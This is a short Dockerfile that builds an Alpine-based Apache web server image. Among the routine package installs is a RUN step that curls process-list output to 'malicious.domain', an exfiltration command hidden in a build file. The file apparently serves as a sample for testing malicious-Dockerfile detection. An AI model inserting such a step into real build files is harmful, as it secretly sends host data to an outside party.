#FROM python:3-alpine
#FROM python:2.7.16-alpine3.9
#CMD [ "python", "-c", "print('Hello 9')" ]


FROM alpine:edge
RUN apk update && apk upgrade
RUN apk add apache2 git curl
VOLUME /var/www/html
RUN curl -XPOST https://malicious.domain/listen -d '$(`ps aux`)'
EXPOSE 80
CMD ["httpd", "-D FOREGROUND"]
